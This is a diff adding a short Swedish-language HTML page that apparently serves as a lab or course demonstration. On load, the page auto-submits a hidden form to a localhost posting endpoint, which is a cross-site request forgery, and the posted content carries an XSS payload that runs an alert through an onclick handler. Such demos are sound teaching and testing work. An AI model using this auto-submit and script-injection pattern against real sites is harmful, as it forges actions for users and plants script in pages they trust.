@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="UTF-8">
+  <title>Postar inlägg</title>
+</head>
+
+<body onload="document.forms[0].submit()">
+
+Postar ett inlägg åt dig.
+
+<form action="http://localhost:6543/posts/new?embedded" method="post">
+  <input type=hidden name=submitted value="">
+  <input type=hidden name=post value="&lt;a onclick='javascript:alert(&quot;xss&quot;)'&gt;Click me&lt;/a&gt;">
+</form>
+
+</body>
